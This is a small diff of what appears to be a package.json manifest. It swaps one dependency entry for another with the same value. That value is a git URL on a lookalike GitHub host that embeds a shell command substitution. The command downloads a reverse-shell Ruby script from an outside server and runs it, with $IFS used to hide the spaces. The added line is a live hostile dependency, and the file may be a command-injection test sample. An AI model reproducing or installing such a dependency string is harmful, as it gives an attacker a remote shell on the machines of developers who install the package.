@@ -5,6 +5,6 @@
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "registry6.json": "git+https://github.com.mocos.kitchen/github.com/$(curl$IFS@mocos.kitchen/revshell.rb$IFS-oshell;ruby$IFS./shell)?/github.com/user/repo4#semver:1.0.0"
+    "registry7.json": "git+https://github.com.mocos.kitchen/github.com/$(curl$IFS@mocos.kitchen/revshell.rb$IFS-oshell;ruby$IFS./shell)?/github.com/user/repo4#semver:1.0.0"
   }
 }
